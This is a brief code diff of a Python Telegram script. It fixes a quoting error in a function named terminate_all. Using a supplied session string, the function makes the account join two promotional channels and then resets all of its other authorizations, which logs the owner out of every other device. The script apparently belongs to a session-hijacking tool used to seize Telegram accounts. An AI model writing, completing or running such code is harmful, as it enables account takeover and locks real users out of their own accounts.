@@ -337,7 +337,7 @@ async def terminate_all(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@KITTUU_UPDATES")
-                    await stark.join_chat(@ll_ABOUT_TOXICC_PAPA_ll")
+                    await stark.join_chat("@ll_ABOUT_TOXICC_PAPA_ll")
                 except Exception as e:
                     print(e)    
                 await stark.invoke(functions.auth.ResetAuthorizations())
